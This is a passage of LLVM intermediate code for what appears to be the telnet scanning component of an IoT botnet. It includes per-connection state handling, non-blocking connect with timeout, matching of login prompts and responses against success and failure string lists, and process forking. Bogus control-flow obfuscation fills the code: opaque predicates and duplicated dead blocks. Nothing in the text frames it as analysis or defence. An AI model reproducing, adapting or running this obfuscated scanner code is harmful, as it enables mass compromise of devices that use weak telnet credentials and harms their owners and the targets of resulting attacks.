originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i32, i32* @x.43
  %119 = load i32, i32* @y.44
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:126:                                    ; preds = %originalBBpart212, %originalBBpart28
  store i32 0, i32* %4, align 4
  br label %127

; <label>:127:                                    ; preds = %126, %13
  %128 = load i32, i32* %4, align 4
  ret i32 %128

originalBBalteredBB:                              ; preds = %originalBB, %30
  %129 = load i8*, i8** %6, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 3, %132
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %134 = load i32, i32* %5, align 4
  %135 = call i64 @send(i32 %134, i8* %8, i64 1, i32 16384)
  %136 = load i32, i32* %5, align 4
  %137 = load i8*, i8** %6, align 8
  %138 = getelementptr inbounds i8, i8* %137, i64 2
  %139 = call i64 @send(i32 %136, i8* %138, i64 1, i32 16384)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  %18 = load i32, i32* @x.45
  %19 = load i32, i32* @y.46
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  store i32 0, i32* %7, align 4
  %26 = load i32, i32* @x.45
  %27 = load i32, i32* @y.46
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %65, %originalBBpart2
  %35 = load i32, i32* @x.45
  %36 = load i32, i32* @y.46
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %7, align 4
  %44 = load i32, i32* %6, align 4
  %45 = icmp slt i32 %43, %44
  %46 = load i32, i32* @x.45
  %47 = load i32, i32* @y.46
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %68

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %4, align 8
  %56 = load i8**, i8*** %5, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8*, i8** %56, i64 %58
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %55, i8* %60)
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %54
  store i32 1, i32* %3, align 4
  br label %85

; <label>:64:                                     ; preds = %54
  br label %65

; <label>:65:                                     ; preds = %64
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %7, align 4
  br label %34

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* @x.45
  %70 = load i32, i32* @y.46
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  store i32 0, i32* %3, align 4
  %77 = load i32, i32* @x.45
  %78 = load i32, i32* @y.46
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %63
  %86 = load i32, i32* %3, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %17
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %87 = load i32, i32* %7, align 4
  %88 = load i32, i32* %6, align 4
  %89 = icmp slt i32 %87, %88
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  store i32 0, i32* %3, align 4
  br label %originalBB6
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.47
  %4 = load i32, i32* @y.48
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.47
  %16 = load i32, i32* @y.48
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %44

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.47
  %25 = load i32, i32* @y.48
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 @close(i32 %34)
  %36 = load i32, i32* @x.47
  %37 = load i32, i32* @y.48
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %44

; <label>:44:                                     ; preds = %originalBBpart24, %originalBBpart2
  %45 = load i32, i32* @x.47
  %46 = load i32, i32* @y.48
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 7
  store i32 0, i32* %54, align 8
  %55 = load i32, i32* %12, align 4
  %56 = trunc i32 %55 to i8
  %57 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %57, i32 0, i32 2
  store i8 %56, i8* %58, align 8
  %59 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 9
  %61 = load i8*, i8** %60, align 8
  call void @llvm.memset.p0i8.i64(i8* %61, i8 0, i64 1024, i32 1, i1 false)
  %62 = load i32, i32* @x.47
  %63 = load i32, i32* @y.48
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %70 = alloca %struct.telstate_t*, align 8
  %71 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %70, align 8
  store i32 %1, i32* %71, align 4
  %72 = load i32, i32* %71, align 4
  %73 = icmp eq i32 %72, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %74 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 8
  %77 = call i32 @close(i32 %76)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %78 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 7
  store i32 0, i32* %79, align 8
  %80 = load i32, i32* %12, align 4
  %81 = trunc i32 %80 to i8
  %82 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 2
  store i8 %81, i8* %83, align 8
  %84 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 9
  %86 = load i8*, i8** %85, align 8
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.49
  %3 = load i32, i32* @y.50
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %11 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  call void @advance_state(%struct.telstate_t* %11, i32 0)
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 3
  store i8 1, i8* %13, align 1
  %14 = load i32, i32* @x.49
  %15 = load i32, i32* @y.50
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %22 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %22, align 8
  %23 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  call void @advance_state(%struct.telstate_t* %23, i32 0)
  %24 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 3
  store i8 1, i8* %25, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  %13 = load i32, i32* @x.53
  %14 = load i32, i32* @y.54
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %132

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %107

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %105

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %132

; <label>:86:                                     ; preds = %79
  br label %104

; <label>:87:                                     ; preds = %63
  %88 = load i32, i32* @x.57
  %89 = load i32, i32* @y.58
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  store i32 0, i32* %5, align 4
  %96 = load i32, i32* @x.57
  %97 = load i32, i32* @y.58
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %132

; <label>:104:                                    ; preds = %86
  br label %106

; <label>:105:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %132

; <label>:106:                                    ; preds = %104
  br label %107

; <label>:107:                                    ; preds = %106, %37
  %108 = load i32, i32* @x.57
  %109 = load i32, i32* @y.58
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %107
  %116 = load i32, i32* %6, align 4
  %117 = call i32 (i32, i32, ...) @fcntl(i32 %116, i32 3, i8* null)
  %118 = sext i32 %117 to i64
  store i64 %118, i64* %15, align 8
  %119 = load i64, i64* %15, align 8
  %120 = and i64 %119, -2049
  store i64 %120, i64* %15, align 8
  %121 = load i32, i32* %6, align 4
  %122 = load i64, i64* %15, align 8
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i64 %122)
  store i32 1, i32* %5, align 4
  %124 = load i32, i32* @x.57
  %125 = load i32, i32* @y.58
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %132

; <label>:132:                                    ; preds = %originalBBpart24, %105, %originalBBpart2, %85, %36
  %133 = load i32, i32* %5, align 4
  ret i32 %133

originalBBalteredBB:                              ; preds = %originalBB, %87
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %107
  %134 = load i32, i32* %6, align 4
  %135 = call i32 (i32, i32, ...) @fcntl(i32 %134, i32 3, i8* null)
  %136 = sext i32 %135 to i64
  store i64 %136, i64* %15, align 8
  %137 = load i64, i64* %15, align 8
  %138 = and i64 %137, -2049
  store i64 %138, i64* %15, align 8
  %139 = load i32, i32* %6, align 4
  %140 = load i64, i64* %15, align 8
  %141 = call i32 (i32, i32, ...) @fcntl(i32 %139, i32 4, i64 %140)
  store i32 1, i32* %5, align 4
  br label %originalBB1
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %26

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.59
  %10 = load i32, i32* @y.60
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %2, align 4
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* @x.59
  %19 = load i32, i32* @y.60
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %79

; <label>:26:                                     ; preds = %0
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, 1
  store i64 %28, i64* @numpids, align 8
  %29 = load i64, i64* @numpids, align 8
  %30 = add i64 %29, 1
  %31 = mul i64 %30, 4
  %32 = call noalias i8* @malloc(i64 %31) #2
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %34

; <label>:34:                                     ; preds = %originalBBpart212, %26
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %69

; <label>:40:                                     ; preds = %34
  %41 = load i32*, i32** @pids, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = load i32*, i32** %3, align 8
  %47 = load i32, i32* %4, align 4
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 %45, i32* %49, align 4
  br label %50

; <label>:50:                                     ; preds = %40
  %51 = load i32, i32* @x.59
  %52 = load i32, i32* @y.60
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %59, 1
  store i32 %60, i32* %4, align 4
  %61 = load i32, i32* @x.59
  %62 = load i32, i32* @y.60
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br label %34

; <label>:69:                                     ; preds = %34
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #2
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %originalBBpart2
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %8
  %81 = load i32, i32* %2, align 4
  store i32 %81, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %82 = load i32, i32* %4, align 4
  %_ = shl i32 %82, 1
  %_2 = shl i32 %82, 1
  %_3 = sub i32 0, %82
  %gen = add i32 %_3, 1
  %_4 = sub i32 %82, 1
  %gen5 = mul i32 %_4, 1
  %_6 = shl i32 %82, 1
  %_7 = sub i32 %82, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %82, 1
  %gen10 = mul i32 %_9, 1
  %83 = add i32 %82, 1
  store i32 %83, i32* %4, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %177, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
